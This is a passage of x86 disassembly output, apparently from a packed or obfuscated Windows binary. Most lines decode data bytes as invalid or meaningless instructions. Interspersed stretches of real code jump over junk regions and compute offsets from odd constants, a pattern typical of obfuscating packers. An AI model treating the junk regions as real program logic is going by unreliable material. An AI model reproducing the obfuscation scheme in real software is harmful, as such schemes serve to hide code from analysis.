  40da0e:	sbb    DWORD PTR [ebp+ecx*4-0x9],esp
  40da12:	jo     0x40d9fb
  40da14:	in     eax,dx
  40da15:	lods   al,BYTE PTR ds:[esi]
  40da16:	xchg   edx,eax
  40da17:	inc    ecx
  40da18:	mov    WORD PTR es:[ebx],fs
  40da1b:	pop    esi
  40da1c:	jbe    0x40d9a8
  40da1e:	pop    esp
  40da1f:	and    cl,BYTE PTR [esi-0x4b]
  40da22:	mov    al,ds:0x2a199fa3
  40da27:	loop   0x40d9ac
  40da29:	test   al,0x49
  40da2b:	(bad)  
  40da2c:	fistp  QWORD PTR [esp+esi*2+0x47383f01]
  40da33:	rol    BYTE PTR [eax],0xbf
  40da36:	inc    esp
  40da37:	cmp    al,0x74
  40da39:	mov    esi,0x8e6d631a
  40da3e:	test   DWORD PTR [edx+0x1c815874],edi
  40da44:	rol    DWORD PTR [ecx-0x38],cl
  40da47:	mov    esp,0xf334cc88
  40da4c:	xor    bl,BYTE PTR [ebx]
  40da4e:	imul   BYTE PTR [esi+eiz*4]
  40da51:	sbb    edi,esp
  40da53:	sbb    al,0x9
  40da55:	icebp  
  40da56:	mov    ebx,0x59b24e55
  40da5b:	sub    al,0xa2
  40da5d:	sub    ah,BYTE PTR [esi+0x1ebff68b]
  40da63:	xchg   ebp,eax
  40da64:	outs   dx,BYTE PTR ds:[esi]
  40da65:	sub    ecx,ebx
  40da67:	mov    ebx,0x1ba11926
  40da6c:	adc    al,0xf9
  40da6e:	stos   BYTE PTR es:[edi],al
  40da6f:	ins    DWORD PTR es:[edi],dx
  40da70:	(bad)  
  40da71:	loopne 0x40da61
  40da73:	inc    edx
  40da74:	test   esp,ecx
  40da76:	fs push eax
  40da78:	cmp    eax,0x34276925
  40da7d:	cmc    
  40da7e:	scas   al,BYTE PTR es:[edi]
  40da7f:	loope  0x40da79
  40da81:	lds    edx,FWORD PTR [edi-0x1d926854]
  40da87:	sub    eax,0x10e406e4
  40da8c:	inc    ebx
  40da8d:	aam    0x72
  40da8f:	mov    bh,0xcf
  40da91:	test   BYTE PTR [esi-0x4a],0x85
  40da95:	hlt    
  40da96:	adc    DWORD PTR [edx+0x50],esi
  40da99:	xor    ecx,DWORD PTR [esi-0x1b]
  40da9c:	adc    eax,0xa6c5843f
  40daa1:	ffreep st(5)
  40daa3:	loopne 0x40daf2
  40daa5:	mov    bl,0x64
  40daa7:	sbb    al,0x58
  40daa9:	lock lods al,BYTE PTR ds:[esi]
  40daab:	sub    al,0xea
  40daad:	xor    DWORD PTR [edx-0x6e],0xffffffcd
  40dab1:	popf   
  40dab2:	es adc eax,0xfa4dd3b4
  40dab8:	cli    
  40dab9:	mov    al,ds:0xff8e78dc
  40dabe:	cmc    
  40dabf:	xlat   BYTE PTR ds:[ebx]
  40dac0:	mov    ecx,0x4c4d8f19
  40dac5:	repnz sub edi,edi
  40dac8:	cmc    
  40dac9:	call   0x43a5:0xb2ecae01
  40dad0:	loope  0x40da8d
  40dad2:	repnz test BYTE PTR [esi+0x39b21267],bh
  40dad9:	gs daa 
  40dadb:	mov    dl,BYTE PTR [esi]
  40dadd:	aaa    
  40dade:	dec    ecx
  40dadf:	hlt    
  40dae0:	pop    es
  40dae1:	xor    DWORD PTR [eax+0x70],edx
  40dae4:	stos   DWORD PTR es:[edi],eax
  40dae5:	in     eax,0xd6
  40dae7:	shl    DWORD PTR [ebx],1
  40dae9:	mov    eax,ds:0xe7279f6b
  40daee:	cld    
  40daef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daf0:	int    0x73
  40daf2:	adc    BYTE PTR [ebx+ebx*4+0x5033256],bh
  40daf9:	xor    eax,DWORD PTR [esi-0x4c]
  40dafc:	xchg   BYTE PTR [ebp+0x5407cd18],cl
  40db02:	int    0x42
  40db04:	test   DWORD PTR [edx],esi
  40db06:	(bad)  
  40db07:	xchg   ecx,eax
  40db08:	jb     0x40db38
  40db0a:	dec    esi
  40db0b:	(bad)  
  40db0d:	fiadd  WORD PTR [edi+0x690a7840]
  40db13:	push   esi
  40db14:	mov    dh,0x52
  40db16:	mov    ds:0xeb543cf6,eax
  40db1b:	lahf   
  40db1c:	ins    DWORD PTR es:[edi],dx
  40db1d:	push   esi
  40db1e:	push   0x5f6bbe3d
  40db23:	test   eax,0x53d4a88f
  40db28:	mov    bh,0xc2
  40db2a:	inc    edx
  40db2b:	inc    esi
  40db2c:	push   ecx
  40db2d:	inc    esp
  40db2e:	push   edx
  40db2f:	mov    es,WORD PTR [ebp+0x27da425b]
  40db35:	mov    ebp,0xf5942d44
  40db3a:	xchg   ebp,eax
  40db3b:	jl     0x40dba2
  40db3d:	popf   
  40db3e:	aam    0x3f
  40db40:	pushf  
  40db41:	xchg   ebx,eax
  40db42:	push   ss
  40db43:	repz mov eax,DWORD PTR [ebp+0x8]
  40db47:	imul   ecx,ecx,0x2e01
  40db4d:	mov    esi,DWORD PTR [ebp-0x4]
  40db50:	add    eax,edi
  40db52:	div    esi
  40db54:	mov    edx,DWORD PTR [ebp-0x8]
  40db57:	mov    esi,0x940a7
  40db5c:	sub    ecx,0x16bea86
  40db62:	sub    eax,edx
  40db64:	xor    edx,edx
  40db66:	div    esi
  40db68:	mov    esi,0xdbd
  40db6d:	add    eax,esi
  40db6f:	cmp    ecx,eax
  40db71:	jae    0x40e47e
  40db77:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40db7e:	mov    DWORD PTR [ebp-0x20],0x383e
  40db85:	jmp    0x40de49
  40db8a:	test   DWORD PTR [ebx-0x21],edi
  40db8d:	in     eax,0xdf
  40db8f:	gs jnp 0x40dbed
  40db92:	les    ebp,FWORD PTR [edi+0x61]
  40db95:	jo     0x40dc01
  40db97:	jne    0x40db99
  40db99:	mov    esi,0x1818d25b
  40db9e:	rcl    BYTE PTR [eax+ebx*1],cl
  40dba1:	sbb    BYTE PTR [eax],bh
  40dba3:	outs   dx,BYTE PTR ds:[esi]
  40dba4:	stos   DWORD PTR es:[edi],eax
  40dba5:	clc    
  40dba6:	(bad)  
  40dba7:	mov    eax,ds:0x10b56a4
  40dbac:	mov    al,0x1f
  40dbae:	pop    esi
  40dbaf:	cmc    
  40dbb0:	lahf   
  40dbb1:	inc    esi
  40dbb2:	(bad)  
  40dbb3:	fwait
  40dbb4:	repz enter 0x2d26,0xff
  40dbb9:	xor    BYTE PTR [ebp+0x24],dh
  40dbbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbbd:	jno    0x40dbb0
  40dbbf:	push   0x1d
  40dbc1:	ret    
  40dbc2:	add    eax,0x914ef881
  40dbc7:	mov    cl,0x6c
  40dbc9:	out    0xcf,eax
  40dbcb:	mov    eax,0x38c49b20
  40dbd0:	rol    DWORD PTR [ebp+ebp*4+0x31],cl
  40dbd4:	xchg   ebx,eax
  40dbd5:	or     ch,BYTE PTR [eax]
  40dbd7:	xor    BYTE PTR [ecx],0xc2
  40dbda:	mov    edi,0xe00420cd
  40dbdf:	mov    edx,0xa7047e4e
  40dbe4:	je     0x40dbc4
  40dbe6:	and    al,0x89
  40dbe8:	retf   
  40dbe9:	pop    ebx
  40dbea:	sbb    edx,DWORD PTR [ecx+esi*4-0x29]
  40dbee:	xor    BYTE PTR [ecx],dl
  40dbf0:	pop    ebx
  40dbf1:	jmp    DWORD PTR [edx+eiz*8+0x70]
  40dbf5:	(bad)  
  40dbf6:	mov    esp,0x93b44f3b
  40dbfb:	jmp    0x1c7d:0xbf1493ea
  40dc02:	loope  0x40db85
  40dc04:	sbb    BYTE PTR [eax*8+0xaa6b521],al
  40dc0b:	ins    BYTE PTR es:[edi],dx
  40dc0c:	jae    0x40dc42
  40dc0e:	inc    esp
  40dc0f:	pop    ebp
  40dc10:	loope  0x40dc03
  40dc12:	xor    dl,BYTE PTR [ecx+0x2d49fc1]
  40dc18:	or     bl,dh
  40dc1a:	and    DWORD PTR [eax-0x599fba82],edi
  40dc20:	xor    eax,0x8761e2b9
  40dc25:	sbb    eax,ebp
  40dc27:	pop    es
  40dc28:	sub    edi,DWORD PTR [edi]
  40dc2a:	arpl   WORD PTR [ebp+0x793998ca],ax
  40dc30:	lods   al,BYTE PTR ds:[esi]
  40dc31:	es ins BYTE PTR es:[edi],dx
  40dc33:	cmc    
  40dc34:	dec    esp
  40dc35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc36:	daa    
  40dc37:	(bad)  
  40dc38:	jno    0x40dc5c
  40dc3a:	ret    
  40dc3b:	mov    ecx,0x8600e29
  40dc40:	mov    ds:0x9fe4b913,al
  40dc45:	in     eax,0x2f
  40dc47:	aas    
  40dc48:	in     eax,dx
  40dc49:	sbb    ecx,DWORD PTR [eax-0x1c]
  40dc4c:	push   ebp
  40dc4d:	ret    0xbe0c
  40dc50:	repnz xchg ebp,eax
  40dc52:	adc    eax,0x3a793ed2
  40dc57:	and    DWORD PTR [esi-0x2d],esi
  40dc5a:	or     eax,0x3a57f3e2
  40dc5f:	xchg   edi,eax
  40dc60:	sbb    dl,BYTE PTR [eax]
  40dc62:	sbb    dl,BYTE PTR [eax+0x644adaf]
  40dc68:	push   ebp
  40dc69:	(bad)  
  40dc6a:	ds stos DWORD PTR es:[edi],eax
  40dc6c:	out    0x57,eax
  40dc6e:	jge    0x40dbfb
  40dc70:	stc    
  40dc71:	jb     0x40dc58
  40dc73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc74:	adc    BYTE PTR [edi-0x365c5c48],cl
  40dc7a:	add    esp,ebx
  40dc7c:	iret   
  40dc7d:	xor    al,0x6c
  40dc7f:	clc    
  40dc80:	enter  0x2497,0x8a
  40dc84:	pop    DWORD PTR [eax+ecx*2+0x72]
  40dc88:	jo     0x40dcb1
  40dc8a:	jle    0x40dc63
  40dc8c:	sub    dl,BYTE PTR [esp+edi*2-0x5ed95a3d]
  40dc93:	addr16 mov al,0xcc
  40dc96:	add    ecx,DWORD PTR [ebp-0x4c]
  40dc99:	imul   BYTE PTR [ebp+0x180eb233]
  40dc9f:	or     DWORD PTR [edi+0x3a53c2fc],0x945624c2
  40dca9:	adc    eax,0x4fa65bee
  40dcae:	in     eax,dx
  40dcaf:	rcr    ecx,0xc8
  40dcb2:	cmp    ah,al
  40dcb4:	push   ebp
  40dcb5:	mov    cl,0x30
  40dcb7:	jl     0x40dce3
  40dcb9:	icebp  
  40dcba:	push   ss
  40dcbb:	and    bh,BYTE PTR [esi-0x3b]
  40dcbe:	adc    al,0xc6
  40dcc0:	pop    ebp
  40dcc1:	(bad)  
  40dcc2:	(bad)  
  40dcc3:	call   0x488e6f10
  40dcc8:	mov    ecx,0x64c074dc
  40dccd:	pop    ebp
  40dcce:	xlat   BYTE PTR ds:[ebx]
  40dccf:	es add eax,0x35487021
  40dcd5:	or     cl,BYTE PTR [edi-0x94f3639]
  40dcdb:	or     BYTE PTR [esi+0x7d07132a],al
  40dce1:	push   esi
  40dce2:	push   es
  40dce3:	dec    esi
  40dce4:	xlat   BYTE PTR ds:[ebx]
  40dce5:	jb     0x40dd5d
  40dce7:	mov    ch,0x5
  40dce9:	jecxz  0x40dcb1
  40dceb:	mov    cl,0xc5
  40dced:	adc    ebx,esp
  40dcef:	scas   al,BYTE PTR es:[edi]
  40dcf0:	jge    0x40dcd6
  40dcf2:	or     bh,BYTE PTR [edx]
  40dcf4:	cmp    al,0x7a
  40dcf6:	shl    DWORD PTR [esi],0xb0
  40dcf9:	leave  
  40dcfa:	into   
  40dcfb:	pushf  
  40dcfc:	pushf  
  40dcfd:	sbb    BYTE PTR [ebx-0x276de7d],bl
  40dd03:	das    
  40dd04:	or     ah,BYTE PTR [ecx+0x54884906]
  40dd0a:	imul   ebp,DWORD PTR [edi+0x1],0x8
  40dd0e:	call   0xa89145a9
  40dd13:	jae    0x40dd23
  40dd15:	inc    ecx
  40dd16:	push   edi
  40dd17:	push   edi
  40dd18:	cmp    eax,ebx
  40dd1a:	xor    esp,ebp
  40dd1c:	mov    ds:0x1570477f,al
  40dd21:	stc    
  40dd22:	shr    BYTE PTR [edi],cl
  40dd24:	rol    DWORD PTR [esi],0x54
  40dd27:	call   0x652ee38e
  40dd2c:	jae    0x40dda3
  40dd2e:	add    cl,BYTE PTR [si+0x24]
  40dd32:	shl    esp,1
  40dd34:	jo     0x40dd4e
  40dd36:	mov    ch,0x98
  40dd38:	or     eax,0x5b213a88
  40dd3d:	fiadd  DWORD PTR [ecx]
  40dd3f:	sbb    dh,BYTE PTR [ebx-0x5e]
  40dd42:	lock adc edx,DWORD PTR [edx+eax*1+0x7d5a0a5a]
  40dd4a:	jge    0x40dd1b
  40dd4c:	xor    ebp,esi
  40dd4e:	xchg   edi,eax
  40dd4f:	dec    ecx
  40dd50:	mov    al,0xa9
  40dd52:	xchg   ebx,eax
  40dd53:	aam    0x5c
  40dd55:	pop    ss
  40dd56:	ins    BYTE PTR es:[edi],dx
  40dd57:	dec    esi
  40dd58:	loopne 0x40dd15
  40dd5a:	ror    bh,cl
  40dd5c:	addr16 popf 
  40dd5e:	inc    edx
  40dd5f:	xor    DWORD PTR [ecx+0x4d],0xffffff8d
  40dd63:	mov    bl,0xfe
  40dd65:	out    0x34,al
  40dd67:	lds    edx,FWORD PTR [eax+0x79]
  40dd6a:	adc    dh,BYTE PTR [edi+0x1]
  40dd6d:	mov    esp,0xf6ebbce7
  40dd72:	addr16 dec ebp
  40dd74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd75:	cli    
  40dd76:	pop    ecx
  40dd77:	adc    al,0xdb
  40dd79:	fnstenv [edi+0x187c7c1]
  40dd7f:	push   edx
  40dd80:	inc    edx
  40dd81:	xor    dh,BYTE PTR [ecx+0x3c27250f]
  40dd87:	ret    
  40dd88:	xchg   ecx,eax
  40dd89:	int    0x28
  40dd8b:	pusha  
  40dd8c:	outs   dx,DWORD PTR ds:[esi]
  40dd8d:	out    dx,eax
  40dd8e:	cdq    
  40dd8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd90:	out    dx,al
  40dd91:	jbe    0x40dde9
  40dd93:	in     al,0x1b
  40dd95:	xchg   ebx,edx
  40dd97:	inc    ebx
  40dd98:	idiv   BYTE PTR [ebx-0x5d7f8fe2]
  40dd9e:	jmp    0x720b3296
  40dda3:	adc    ecx,edi
  40dda5:	fmulp  st(1),st
  40dda7:	lods   eax,DWORD PTR ds:[esi]
  40dda8:	cmp    eax,0xde6576b2
  40ddad:	mov    esi,0xb6653874
  40ddb2:	sub    DWORD PTR [ebp-0x72],esp
  40ddb5:	fld    TBYTE PTR [eax+ebp*4]
  40ddb8:	std    
  40ddb9:	loope  0x40dd3e
  40ddbb:	imul   ebp,ebx,0x2399f526
  40ddc1:	js     0x40de11
  40ddc3:	aas    
  40ddc4:	retf   
  40ddc5:	je     0x40dde8
  40ddc7:	adc    al,0xd8
  40ddc9:	popf   
  40ddca:	jbe    0x40ddcb
  40ddcc:	stos   DWORD PTR es:[edi],eax
  40ddcd:	inc    edx
  40ddce:	loope  0x40dddf
  40ddd0:	and    DWORD PTR [eax],esi
  40ddd2:	fwait
  40ddd3:	push   ecx
  40ddd4:	xchg   ebp,eax
  40ddd5:	mov    esi,0x98393f27
  40ddda:	cmp    al,0xff
  40dddc:	inc    eax
  40dddd:	xor    DWORD PTR [esi+eax*8-0x457964e],edi
  40dde4:	fadd   QWORD PTR [edi]
  40dde6:	mov    edx,0x2956deab
  40ddeb:	xlat   BYTE PTR ds:[ebx]
  40ddec:	push   0xe6f750a4
  40ddf1:	jl     0x40ddec
  40ddf3:	dec    ecx
  40ddf4:	jns    0x40dd95
  40ddf6:	mov    ds:0x3e856958,al
  40ddfb:	mov    eax,0x9a4d48ca
  40de00:	pop    ds
  40de01:	and    eax,0xfbed908f
  40de06:	inc    edx
  40de07:	neg    DWORD PTR [edi+0x63e3d294]
  40de0d:	enter  0xb549,0x90
  40de11:	sub    bl,bh
  40de13:	mov    ch,0xdf
  40de15:	push   ebx
  40de16:	xchg   esp,eax
  40de17:	cli    
  40de18:	popa   
  40de19:	stos   BYTE PTR es:[edi],al
  40de1a:	ss push cs
  40de1c:	shl    DWORD PTR [ebp-0x338b547f],cl
  40de22:	sbb    DWORD PTR [edi-0x42f1e04b],0x7f
  40de29:	cli    
  40de2a:	push   edx
  40de2b:	(bad)  
  40de2c:	sti    
  40de2d:	adc    BYTE PTR [edi-0x35],0xd6
  40de31:	ja     0x40ddf6
  40de33:	xor    BYTE PTR [ecx],bh
  40de35:	push   esp
  40de36:	enter  0xe929,0x61
  40de3a:	jl     0x40dde9
  40de3c:	adc    DWORD PTR [eax+0x5b33c314],0xcf27a151
  40de46:	xor    BYTE PTR [edi],dl
  40de48:	pop    edi
  40de4a:	inc    ebp
  40de4b:	fdivr  QWORD PTR [edx]
  40de4d:	cmp    al,BYTE PTR [eax]
  40de4f:	add    bh,al
  40de51:	inc    ebp
  40de52:	in     al,dx
  40de53:	int    0x13
  40de55:	add    BYTE PTR [eax],al
  40de57:	xor    edx,edx
  40de59:	mov    DWORD PTR [ebp-0x18],0x187
  40de60:	mov    DWORD PTR [ebp-0x28],0x3224
  40de67:	mov    eax,DWORD PTR [ebp-0x28]
  40de6a:	push   0x6
  40de6c:	pop    ebx
  40de6d:	div    ebx
  40de6f:	mov    edx,eax
  40de71:	mov    eax,ds:0x422558
  40de76:	mov    eax,DWORD PTR [eax+0x1d0]
  40de7c:	sub    eax,edx
  40de7e:	mov    edx,DWORD PTR [ebp-0x24]
  40de81:	mov    ebx,DWORD PTR [ebp-0x20]
  40de84:	imul   edx,ebx
  40de87:	mov    ebx,DWORD PTR [ebp-0x1c]
  40de8a:	xor    edx,ebx
  40de8c:	sub    edx,0x26bd
  40de92:	add    eax,ecx
  40de94:	and    edx,0x7126
  40de9a:	mov    ebx,ecx
  40de9c:	sub    ebx,edx
  40de9e:	mov    edx,DWORD PTR [ebp-0x18]
  40dea1:	sub    eax,edx
  40dea3:	mov    edx,DWORD PTR [ebp-0x14]
  40dea6:	sub    eax,edx
  40dea8:	mov    edx,DWORD PTR [ebp+0xc]
  40deab:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40deb2:	mov    BYTE PTR [eax-0xbb5],dl
  40deb8:	jmp    0x40e17c
  40debd:	rep stos BYTE PTR es:[edi],al
  40debf:	add    bl,BYTE PTR [ecx]
  40dec1:	mov    ebx,0x23aae2a0
  40dec6:	inc    ebp
  40dec7:	leave  
  40dec8:	jl     0x40de52
  40deca:	out    0x65,al
  40decc:	mov    esp,0x1818cc14
  40ded1:	rcl    BYTE PTR [eax+ebx*1],cl
  40ded4:	sbb    BYTE PTR [ecx],al
  40ded6:	es inc ecx
  40ded8:	fild   WORD PTR [edx-0x3b]
  40dedb:	jecxz  0x40df57
  40dedd:	push   es
  40dede:	mov    ecx,0x3d35f480
  40dee3:	push   esi
  40dee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dee5:	sub    DWORD PTR [eax+0x165edb94],ebx
  40deeb:	sahf   
  40deec:	hlt    
  40deed:	mov    dl,0xc6
  40deef:	mov    cl,0xab
  40def1:	jno    0x40ded2
  40def3:	jp     0x40df1d
  40def5:	out    dx,eax
  40def6:	jp     0x40de83
  40def8:	add    al,0x4c
  40defa:	or     bh,bh
  40defc:	ss and al,0x2d
  40deff:	pop    es
  40df00:	push   ebp
  40df01:	sbb    eax,0x3972feb2
  40df06:	add    ebx,DWORD PTR [ebx+eiz*1-0x36fc516d]
  40df0d:	imul   edi,DWORD PTR [ebx+0x48],0x962983b7
  40df14:	cdq    
  40df15:	sar    DWORD PTR fs:[edx+edx*4],1
  40df19:	adc    ecx,esp
  40df1b:	pusha  
  40df1c:	lahf   
  40df1d:	mov    ah,0xef
  40df1f:	adc    al,0xff
  40df21:	xor    eax,ecx
  40df23:	and    al,0x74
  40df25:	sub    al,0xb3
  40df27:	mov    al,ds:0x7c91ede5
  40df2c:	or     edi,DWORD PTR [ecx]
  40df2e:	pop    eax
  40df2f:	movsx  edx,WORD PTR [ebx-0x73]
  40df33:	sbb    al,0x2e
  40df35:	shl    BYTE PTR [ecx+0x5f],cl
  40df38:	(bad)  
  40df39:	(bad)  
  40df3b:	leave  
  40df3c:	enter  0x2030,0x6f
  40df40:	arpl   WORD PTR [esi],si
  40df42:	loopne 0x40dfab
  40df44:	push   0xdf42e570
  40df49:	add    BYTE PTR [eax],0xb4
  40df4c:	or     cl,BYTE PTR [edx+0x4]
  40df4f:	in     al,0xf3
  40df51:	sub    edx,DWORD PTR [eax+0x2b366d14]
  40df57:	pop    ds
  40df58:	push   cs
  40df59:	cmp    BYTE PTR [edi],bl
  40df5b:	or     eax,0x8751a074
  40df60:	pop    ecx
  40df61:	mov    edi,0x57d10a9f
  40df66:	out    0x99,eax
  40df68:	dec    ebx
  40df69:	and    BYTE PTR [edi+0x7bcabef],bh
  40df6f:	scas   eax,DWORD PTR es:[edi]
  40df70:	dec    esi
  40df71:	mov    ch,0x95
  40df73:	xchg   esi,eax
  40df74:	mov    ch,ch
  40df76:	push   es
  40df77:	mov    ah,0x6f
  40df79:	or     DWORD PTR [eax],esp
  40df7b:	add    ch,BYTE PTR [edi+0x321c3bcd]
  40df81:	call   0xea0f:0x481a6935
  40df88:	test   eax,0xac5bdcf5
  40df8d:	pop    edx
  40df8e:	xchg   edi,eax
  40df8f:	and    edx,ebp
  40df91:	mov    bl,0xb0
  40df93:	(bad)  
  40df94:	push   ss
  40df95:	repnz xabort 0x4
  40df99:	stos   DWORD PTR es:[edi],eax
  40df9a:	mov    bl,0x85
  40df9c:	int3   
  40df9d:	(bad)  
  40df9e:	mov    ebx,0x5c6608f8
  40dfa3:	in     eax,0x44
  40dfa5:	iret   
  40dfa6:	jecxz  0x40df7e
  40dfa8:	or     eax,0x27b7f933
  40dfad:	daa    
  40dfae:	dec    esp
  40dfaf:	push   ecx
  40dfb0:	in     al,0xbd
  40dfb2:	mov    ebx,0x441f9fd
  40dfb7:	inc    ebx
  40dfb8:	add    DWORD PTR [ecx-0x15633229],0x7c
  40dfbf:	xlat   BYTE PTR ds:[ebx]
  40dfc0:	lods   al,BYTE PTR ds:[esi]
  40dfc1:	or     eax,0xe2b63282
  40dfc6:	sbb    cl,BYTE PTR [edx+edi*8]
  40dfc9:	stos   DWORD PTR es:[edi],eax
  40dfca:	in     al,0xfb
  40dfcc:	(bad)  
  40dfcd:	xor    dl,dh
  40dfcf:	int3   
  40dfd0:	fisub  WORD PTR [esp+esi*8-0x1393db98]
  40dfd7:	ins    DWORD PTR es:[edi],dx
  40dfd8:	inc    esi
  40dfd9:	ja     0x40dfd4
  40dfdb:	cli    
  40dfdc:	xor    DWORD PTR ds:0x94714eef,esi
  40dfe2:	bound  edx,QWORD PTR [eax-0xa]
  40dfe5:	xorps  xmm6,XMMWORD PTR [ecx+0x38644fe7]
  40dfec:	nop
  40dfed:	lods   eax,DWORD PTR ds:[esi]
  40dfee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfef:	dec    edi
  40dff0:	add    esp,DWORD PTR [eax+eax*2+0x29776a89]
  40dff7:	inc    ebx
  40dff8:	retf   0x8f4b
  40dffb:	or     BYTE PTR [edi],cl
  40dffd:	xlat   BYTE PTR ds:[ebx]
  40dffe:	shl    BYTE PTR [ebp+eax*2+0x49],1
  40e002:	adc    eax,0xa15eb74
  40e007:	pop    esp
  40e008:	mov    edi,0xbdbcb3df
  40e00d:	fadd   QWORD PTR [edi]
  40e00f:	out    dx,al
  40e010:	icebp  
  40e011:	dec    edx
  40e012:	je     0x40e026
  40e014:	adc    eax,0x994b31f2
  40e019:	test   BYTE PTR [edx+0x20],bh
  40e01c:	push   cs
  40e01d:	fld    QWORD PTR cs:[eax-0x3b]
  40e021:	or     eax,0xad3ae9bf
  40e026:	sahf   
  40e027:	retf   0x6ea9
  40e02a:	(bad)  
  40e02b:	jle    0x40e03d
  40e02d:	mov    ch,0xa2
  40e02f:	stos   BYTE PTR es:[edi],al
  40e030:	jb     0x40dfda
  40e032:	popf   
  40e033:	in     eax,dx
  40e034:	xlat   BYTE PTR ds:[ebx]
  40e035:	or     cl,BYTE PTR [esi]
  40e037:	or     eax,0xf9a6531b
  40e03c:	mov    dh,0x4d
  40e03e:	rcl    DWORD PTR [eax+0x9f76b81],1
  40e044:	pop    esp
  40e045:	sub    edi,DWORD PTR [edi-0x4360bd8a]
  40e04b:	sub    ah,BYTE PTR [ebp-0x45cb3e8e]
  40e051:	repnz mov ecx,0x9e5d4589
  40e057:	mov    al,0x40
  40e059:	adc    bh,BYTE PTR [eax+edi*8]
  40e05c:	pop    eax
  40e05d:	ret    0xdbe8
  40e060:	cld    
  40e061:	mov    dl,BYTE PTR [eax-0x15]
  40e064:	les    edi,FWORD PTR [edx+0x7f]
  40e067:	mov    eax,0xd1fc7c11
  40e06c:	sbb    al,0xc1
  40e06e:	std    
  40e06f:	and    bh,cl
  40e071:	inc    ebx
  40e072:	cmp    esi,DWORD PTR ds:0x25f29ce9
  40e078:	adc    ch,BYTE PTR [edx-0xf]
  40e07b:	mov    bh,0xdd
  40e07d:	iret   
  40e07e:	dec    ecx
  40e07f:	sub    DWORD PTR [ebp+0x1f],edi
  40e082:	sahf   
  40e083:	(bad)  
  40e084:	jbe    0x40e0d3
  40e086:	jmp    0x40e063
  40e088:	jnp    0x40e091
  40e08a:	mov    eax,0x157c7498
  40e08f:	clc    
  40e090:	inc    ebx
  40e091:	aad    0x5b
  40e093:	pop    es
  40e094:	hlt    
  40e095:	ja     0x40e0fa
  40e097:	dec    ebp
  40e098:	inc    eax
  40e099:	dec    eax
  40e09a:	jnp    0x40e04d
  40e09c:	or     al,0x16
  40e09e:	jmp    0x40e07c
  40e0a0:	loope  0x40e0a0
  40e0a2:	and    edx,DWORD PTR [ecx+0x10ba7e7]
  40e0a8:	pop    ebp
  40e0a9:	pop    ss
  40e0aa:	xor    bh,BYTE PTR ds:0xc1964adf
  40e0b0:	into   
  40e0b1:	jp     0x40e050
  40e0b3:	mov    al,0x1d
  40e0b5:	pop    edx
  40e0b6:	shr    BYTE PTR [eax+0xf],cl
  40e0b9:	cld    
  40e0ba:	ins    DWORD PTR es:[edi],dx
  40e0bb:	xchg   esi,eax
  40e0bc:	(bad)  
  40e0bd:	mov    esp,0x86ee52d9
  40e0c2:	pushf  
  40e0c3:	mov    WORD PTR [edi-0x50],?
  40e0c6:	and    eax,0xd2d085f9
  40e0cb:	pop    es
  40e0cc:	mov    ds:0xfedd1fd9,al
  40e0d1:	sahf   
  40e0d2:	and    DWORD PTR [edx],0x3e08abcc
  40e0d8:	sbb    DWORD PTR [eax+0x75],edx
  40e0db:	or     BYTE PTR [esi+0x39ef7e7f],bh
  40e0e1:	dec    edi
  40e0e2:	xor    ecx,DWORD PTR [edi+0x4cb553d3]
  40e0e8:	jno    0x40e078
  40e0ea:	dec    edi
  40e0eb:	retf   
  40e0ec:	jmp    0x40e0c0
  40e0ee:	mov    edx,0xb2f08736
  40e0f3:	retf   0xc4dc
  40e0f6:	inc    ebp
  40e0f7:	enter  0x9dde,0x91
  40e0fb:	jp     0x40e0cc
  40e0fd:	pop    es
  40e0fe:	dec    ebp
  40e0ff:	out    dx,eax
  40e100:	mov    edx,0x9802aee8
  40e105:	fidivr DWORD PTR [esi-0x2435818c]
  40e10b:	lods   al,BYTE PTR ds:[esi]
  40e10c:	mov    ds:0x62a5c4a,eax
  40e111:	mov    bl,0xc4
  40e113:	cdq    
  40e114:	call   0x691922f5
  40e119:	lahf   
  40e11a:	push   eax
  40e11b:	cs imul esi,eax,0xffffffbf
  40e11f:	and    al,0x7f
  40e121:	xchg   edi,eax
  40e122:	push   esi
  40e123:	cmp    BYTE PTR [esi-0x73],dl
  40e126:	scas   al,BYTE PTR es:[edi]
  40e127:	int    0xcc
  40e129:	cwde   
  40e12a:	mov    ah,0x6f
  40e12c:	(bad)  
  40e12d:	jo     0x40e131
  40e12f:	mov    dl,0xa1
  40e131:	pop    esp
  40e132:	scas   eax,DWORD PTR es:[edi]
  40e133:	(bad)  
  40e135:	mov    dl,0x95
  40e137:	or     DWORD PTR [edi+eiz*2-0x6],edx
  40e13b:	adc    eax,0x7d5f4cd7
  40e140:	leave  
  40e141:	not    edx
  40e143:	dec    edi
  40e144:	jo     0x40e1b4
  40e146:	lea    esi,[ecx+0x6bb1bbe0]
  40e14c:	cwde   
  40e14d:	sbb    DWORD PTR [esi],ebx
  40e14f:	push   eax
  40e150:	and    ebp,edx
  40e152:	test   dh,cl
  40e154:	lock cmp edi,DWORD PTR [edi]
  40e157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e158:	push   0x742ef4c5
  40e15d:	fs (bad) 
  40e160:	ffree  st(7)
  40e162:	retf   0x4c4c
  40e165:	leave  
  40e166:	(bad)  
  40e167:	scas   eax,DWORD PTR es:[edi]
  40e168:	in     eax,0xc2
  40e16a:	push   0x43
  40e16c:	js     0x40e16c
  40e16e:	mov    ah,0xfb
  40e170:	les    edi,FWORD PTR ds:0xfd80c5a8
  40e176:	pop    eax
  40e177:	dec    esp
  40e178:	shr    BYTE PTR [ecx+0x458b3119],1
  40e17e:	lock xor eax,0xffffe1ce
  40e184:	add    eax,DWORD PTR [ebp-0xc]
  40e187:	jmp    0x40e44b
  40e18c:	sub    dh,ah
  40e18e:	mov    BYTE PTR [ecx],ah
  40e190:	inc    esi
  40e191:	pop    ds
  40e192:	and    dh,bl
  40e194:	leave  
  40e195:	out    0x4b,eax
  40e197:	jle    0x40e1af
  40e199:	pushf  
  40e19a:	outs   dx,DWORD PTR ds:[esi]
  40e19b:	mov    al,0xce
  40e19d:	enter  0x1818,0xd2
